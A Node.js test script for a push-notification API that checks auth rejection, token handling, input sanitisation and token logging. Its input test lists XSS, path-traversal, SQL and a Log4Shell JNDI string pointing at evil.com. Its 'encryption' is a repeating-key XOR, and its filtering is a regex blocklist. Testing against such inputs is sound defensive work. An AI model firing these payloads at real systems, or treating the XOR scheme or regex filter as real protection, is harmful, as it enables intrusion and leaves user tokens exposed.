#!/usr/bin/env node

/**
 * COMPREHENSIVE NOTIFICATION SYSTEM TEST WITH RATE LIMIT HANDLING
 * 
 * This script performs a complete end-to-end test of the notification system
 * with proper delays to handle rate limiting.
 */

const axios = require('axios');
const crypto = require('crypto');

// Test Configuration
const CONFIG = {
  apiBaseUrl: process.env.API_BASE_URL || 'https://real-estate-optimize-apis.vercel.app',
  testUserId: process.env.TEST_USER_ID || '676b0b4b4c8c5b4d8e9f1234',
  authToken: process.env.AUTH_TOKEN || 'test-jwt-token',
  encryptionKey: process.env.ENCRYPTION_KEY || 'test-encryption-key-12345',
  timeout: 10000,
  retries: 3,
  delayBetweenTests: 2000 // 2 seconds between tests to avoid rate limiting
};

// Test Results Tracker
class TestRunner {
  constructor() {
    this.tests = [];
    this.passed = 0;
    this.failed = 0;
    this.warnings = 0;
    this.startTime = Date.now();
  }

  log(message, level = 'info') {
    const timestamp = new Date().toISOString();
    const prefix = {
      info: '📋',
      success: '✅',
      error: '❌',
      warning: '⚠️',
      debug: '🔍'
    }[level] || '📋';
    
    console.log(`${prefix} [${timestamp}] ${message}`);
  }

  addTest(name, passed, message, details = {}) {
    const result = {
      name,
      passed,
      message,
      details,
      timestamp: new Date().toISOString()
    };
    
    this.tests.push(result);
    
    if (passed === true) {
      this.passed++;
      this.log(`${name}: ${message}`, 'success');
    } else if (passed === false) {
      this.failed++;
      this.log(`${name}: ${message}`, 'error');
      if (Object.keys(details).length > 0) {
        this.log(`Details: ${JSON.stringify(details, null, 2)}`, 'debug');
      }
    } else {
      this.warnings++;
      this.log(`${name}: ${message}`, 'warning');
    }
  }

  async delay(ms = CONFIG.delayBetweenTests) {
    await new Promise(resolve => setTimeout(resolve, ms));
  }

  printSummary() {
    const duration = ((Date.now() - this.startTime) / 1000).toFixed(2);
    
    console.log('\n================================================================================');
    console.log('🔐 NOTIFICATION SYSTEM TEST SUMMARY');
    console.log('================================================================================');
    console.log(`⏱️  Duration: ${duration} seconds`);
    console.log(`✅ Passed: ${this.passed}`);
    console.log(`❌ Failed: ${this.failed}`);
    console.log(`⚠️  Warnings: ${this.warnings}`);
    console.log(`📊 Total: ${this.tests.length}`);
    console.log(`📈 Success Rate: ${((this.passed / this.tests.length) * 100).toFixed(1)}%`);
    
    if (this.failed > 0) {
      console.log('\n❌ FAILED TESTS:');
      this.tests.filter(t => t.passed === false).forEach(test => {
        console.log(`   - ${test.name}: ${test.message}`);
      });
    }
    
    if (this.warnings > 0) {
      console.log('\n⚠️ WARNINGS:');
      this.tests.filter(t => t.passed === null).forEach(test => {
        console.log(`   - ${test.name}: ${test.message}`);
      });
    }
    
    console.log('================================================================================');
    
    if (this.failed === 0) {
      console.log('🎉 ALL TESTS PASSED!');
      console.log('✅ Notification system is ready for production deployment.');
    } else {
      console.log('⚠️ SOME TESTS FAILED!');
      console.log('❌ Review the failed tests and fix issues before production deployment.');
    }
  }
}

// Main test runner
async function runTests() {
  const runner = new TestRunner();
  
  console.log('🔐 STARTING COMPREHENSIVE NOTIFICATION SYSTEM TEST');
  console.log('================================================================================');
  console.log('🌐 API Base URL:', CONFIG.apiBaseUrl);
  console.log('⏰ Started at:', new Date().toISOString());
  console.log('⏱️ Delay between tests:', CONFIG.delayBetweenTests + 'ms');
  console.log('');

  try {
    // Test 1: Configuration Check
    runner.log('Testing configuration...');
    const missingEnvVars = [];
    if (!process.env.API_BASE_URL) missingEnvVars.push('API_BASE_URL');
    
    if (missingEnvVars.length > 0) {
      runner.addTest('Configuration Check', null, `Missing environment variables: ${missingEnvVars.join(', ')}`);
    } else {
      runner.addTest('Configuration Check', true, 'All required environment variables present');
    }
    
    await runner.delay();

    // Test 2: API Connectivity
    try {
      const response = await axios.get(`${CONFIG.apiBaseUrl}/api/health`, { timeout: CONFIG.timeout });
      if (response.status === 200) {
        runner.addTest('API Connectivity', true, 'API server is reachable');
      } else {
        runner.addTest('API Connectivity', false, `Unexpected status: ${response.status}`);
      }
    } catch (error) {
      // Try the main API endpoint if health endpoint doesn't exist
      try {
        const response = await axios.get(CONFIG.apiBaseUrl, { timeout: CONFIG.timeout });
        runner.addTest('API Connectivity', true, 'API server is reachable');
      } catch (fallbackError) {
        runner.addTest('API Connectivity', false, 'API server is not reachable', {
          error: fallbackError.message
        });
      }
    }
    
    await runner.delay();

    // Test 3: Authentication Tests (with longer delays)
    runner.log('Testing API authentication...');
    
    // Test 3a: No Auth Token
    try {
      const response = await axios.post(`${CONFIG.apiBaseUrl}/api/push-token`, {
        userId: CONFIG.testUserId,
        token: 'test-token',
        platform: 'ios'
      }, { timeout: CONFIG.timeout });
      
      if (response.status === 401) {
        runner.addTest('No Auth Token Rejection', true, 'API correctly rejects requests without auth token');
      } else {
        runner.addTest('No Auth Token Rejection', false, 'API should reject requests without auth token', {
          status: response.status,
          expected: 401
        });
      }
    } catch (error) {
      if (error.response && error.response.status === 401) {
        runner.addTest('No Auth Token Rejection', true, 'API correctly rejects requests without auth token');
      } else if (error.response && error.response.status === 429) {
        runner.addTest('No Auth Token Rejection', null, 'Rate limited - cannot test auth rejection', {
          status: error.response.status
        });
      } else {
        runner.addTest('No Auth Token Rejection', false, 'Unexpected error', {
          error: error.message,
          status: error.response?.status
        });
      }
    }
    
    await runner.delay(5000); // Longer delay for auth tests

    // Test 3b: Invalid Auth Token
    try {
      const response = await axios.post(`${CONFIG.apiBaseUrl}/api/push-token`, {
        userId: CONFIG.testUserId,
        token: 'test-token',
        platform: 'ios'
      }, {
        headers: { 'Authorization': 'Bearer invalid-token' },
        timeout: CONFIG.timeout
      });
      
      if (response.status === 401 || response.status === 403) {
        runner.addTest('Invalid Auth Token Rejection', true, 'API correctly rejects invalid auth tokens');
      } else {
        runner.addTest('Invalid Auth Token Rejection', false, 'API should reject invalid auth tokens', {
          status: response.status,
          expected: '401 or 403'
        });
      }
    } catch (error) {
      if (error.response && (error.response.status === 401 || error.response.status === 403)) {
        runner.addTest('Invalid Auth Token Rejection', true, 'API correctly rejects invalid auth tokens');
      } else if (error.response && error.response.status === 429) {
        runner.addTest('Invalid Auth Token Rejection', null, 'Rate limited - cannot test invalid token rejection', {
          status: error.response.status
        });
      } else {
        runner.addTest('Invalid Auth Token Rejection', false, 'Unexpected error', {
          error: error.message,
          status: error.response?.status
        });
      }
    }
    
    await runner.delay(5000); // Longer delay for auth tests

    // Test 3c: Valid Auth Token (if provided)
    if (CONFIG.authToken && CONFIG.authToken !== 'test-jwt-token') {
      try {
        const response = await axios.post(`${CONFIG.apiBaseUrl}/api/push-token`, {
          userId: CONFIG.testUserId,
          userType: 'client',
          token: 'ExponentPushToken[test-token-12345]',
          platform: 'ios',
          deviceId: 'test-device',
          deviceName: 'Test Device',
          appVersion: '1.0.0'
        }, {
          headers: { 'Authorization': `Bearer ${CONFIG.authToken}` },
          timeout: CONFIG.timeout
        });
        
        if (response.status === 200 || response.status === 201) {
          runner.addTest('Valid Auth Token Acceptance', true, 'API accepts valid auth tokens');
        } else {
          runner.addTest('Valid Auth Token Acceptance', false, 'Unexpected response with valid token', {
            status: response.status,
            message: response.data?.message
          });
        }
      } catch (error) {
        if (error.response && error.response.status === 429) {
          runner.addTest('Valid Auth Token Acceptance', null, 'Rate limited - cannot test valid token', {
            status: error.response.status
          });
        } else {
          runner.addTest('Valid Auth Token Acceptance', false, 'Error with valid token', {
            error: error.message,
            status: error.response?.status,
            data: error.response?.data
          });
        }
      }
    } else {
      runner.addTest('Valid Auth Token Acceptance', null, 'No valid JWT token provided for testing');
    }
    
    await runner.delay(10000); // Extra long delay before input validation tests

    // Test 4: Security Implementation Tests (local tests, no API calls)
    runner.log('Testing security implementation...');
    
    // Test token encryption/decryption
    try {
      const testToken = 'ExponentPushToken[test-12345]';
      const key = CONFIG.encryptionKey.padEnd(32, '0').slice(0, 32);
      
      // Simple encryption test (matching the React Native compatible version)
      let encrypted = '';
      for (let i = 0; i < testToken.length; i++) {
        const tokenChar = testToken.charCodeAt(i);
        const keyChar = key.charCodeAt(i % key.length);
        encrypted += String.fromCharCode(tokenChar ^ keyChar);
      }
      const encryptedToken = Buffer.from(encrypted).toString('base64');
      
      // Simple decryption test
      const decryptedBuffer = Buffer.from(encryptedToken, 'base64');
      const decryptedEncrypted = decryptedBuffer.toString();
      let decrypted = '';
      for (let i = 0; i < decryptedEncrypted.length; i++) {
        const encryptedChar = decryptedEncrypted.charCodeAt(i);
        const keyChar = key.charCodeAt(i % key.length);
        decrypted += String.fromCharCode(encryptedChar ^ keyChar);
      }
      
      if (decrypted === testToken) {
        runner.addTest('Token Encryption/Decryption', true, 'Token encryption working correctly');
      } else {
        runner.addTest('Token Encryption/Decryption', false, 'Token encryption/decryption failed');
      }
      
      // Test obfuscation
      if (encryptedToken !== testToken && encryptedToken.length > 0) {
        runner.addTest('Token Obfuscation', true, 'Token properly obfuscated when encrypted');
      } else {
        runner.addTest('Token Obfuscation', false, 'Token not properly obfuscated');
      }
    } catch (error) {
      runner.addTest('Token Encryption/Decryption', false, 'Encryption test failed', {
        error: error.message
      });
    }
    
    // Test input validation
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      '../../etc/passwd',
      'DROP TABLE users;',
      '${jndi:ldap://evil.com/a}'
    ];
    
    let validationPassed = 0;
    maliciousInputs.forEach(input => {
      // Simple validation check (matching the backend sanitization)
      const sanitized = input
        .replace(/<script.*?>.*?<\/script>/gi, '')
        .replace(/javascript:/gi, '')
        .replace(/data:text\/html/gi, '')
        .replace(/on\w+\s*=/gi, '')
        .replace(/\$\{.*?\}/gi, '') // Remove template literals
        .replace(/DROP\s+TABLE/gi, '') // Remove SQL injection attempts
        .replace(/\.\.\/\.\.\//gi, '') // Remove path traversal attempts
        .replace(/jndi:/gi, '') // Remove JNDI injection attempts
        .trim();
      
      if (sanitized !== input) {
        validationPassed++;
      }
    });
    
    if (validationPassed === maliciousInputs.length) {
      runner.addTest('Input Validation', true, 'All malicious inputs correctly identified');
    } else {
      runner.addTest('Input Validation', false, `Only ${validationPassed}/${maliciousInputs.length} malicious inputs identified`);
    }

    // Test 5: File Security Tests
    runner.log('Testing file security...');
    
    const fs = require('fs');
    const path = require('path');
    
    // Check if secure service exists
    const secureServicePath = path.join(__dirname, 'services', 'secureNotificationService.ts');
    if (fs.existsSync(secureServicePath)) {
      runner.addTest('Secure Service Implementation', true, 'SecureNotificationService file exists');
      
      // Check for security features in the file
      const secureServiceContent = fs.readFileSync(secureServicePath, 'utf8');
      
      const securityFeatures = [
        { name: 'Token Encryption', pattern: /encryptToken|decryptToken/ },
        { name: 'Input Validation', pattern: /validateNotificationContent|sanitizeNotificationData/ },
        { name: 'URL Validation', pattern: /validateNavigationUrl/ },
        { name: 'Content Sanitization', pattern: /sanitizeNotificationData/ }
      ];
      
      securityFeatures.forEach(feature => {
        if (feature.pattern.test(secureServiceContent)) {
          runner.addTest(`Security Feature: ${feature.name}`, true, `${feature.name} implementation found`);
        } else {
          runner.addTest(`Security Feature: ${feature.name}`, false, `${feature.name} implementation not found`);
        }
      });
      
    } else {
      runner.addTest('Secure Service Implementation', false, 'SecureNotificationService file not found');
    }

    // Test 6: Check for insecure logging
    const filesToCheck = [
      'services/pushTokenService.ts',
      'services/notificationManager.ts',
      'contexts/AuthContext.tsx'
    ];
    
    filesToCheck.forEach(filePath => {
      const fullPath = path.join(__dirname, filePath);
      if (fs.existsSync(fullPath)) {
        const content = fs.readFileSync(fullPath, 'utf8');
        
        // Check for insecure token logging patterns
        const insecurePatterns = [
          /console\.log.*token.*:/i,
          /console\.log.*Token.*:/i,
          /console\.log.*['"`].*token.*['"`]/i,
          /console\.log.*['"`].*Token.*['"`]/i
        ];
        
        let hasInsecureLogging = false;
        insecurePatterns.forEach(pattern => {
          if (pattern.test(content)) {
            // Check if it's actually logging the token value (not just metadata)
            const matches = content.match(pattern);
            if (matches) {
              // Look for patterns that suggest actual token values are being logged
              const tokenValuePatterns = [
                /token\s*:/,
                /Token\s*:/,
                /token\s*,/,
                /Token\s*,/
              ];
              
              matches.forEach(match => {
                tokenValuePatterns.forEach(valuePattern => {
                  if (valuePattern.test(match)) {
                    hasInsecureLogging = true;
                  }
                });
              });
            }
          }
        });
        
        if (hasInsecureLogging) {
          runner.addTest(`Secure Logging: ${filePath}`, false, 'Insecure token logging found', {
            file: filePath,
            hasInsecureLogging: true
          });
        } else {
          runner.addTest(`Secure Logging: ${filePath}`, true, 'No insecure token logging found');
        }
      } else {
        runner.addTest(`Secure Logging: ${filePath}`, null, 'File not found for logging check');
      }
    });

  } catch (error) {
    runner.addTest('Test Suite Execution', false, 'Test suite encountered an error', {
      error: error.message
    });
  }

  // Print final summary
  runner.printSummary();
  
  // Exit with appropriate code
  process.exit(runner.failed > 0 ? 1 : 0);
}

// Run the tests
runTests().catch(error => {
  console.error('❌ Fatal error running tests:', error);
  process.exit(1);
});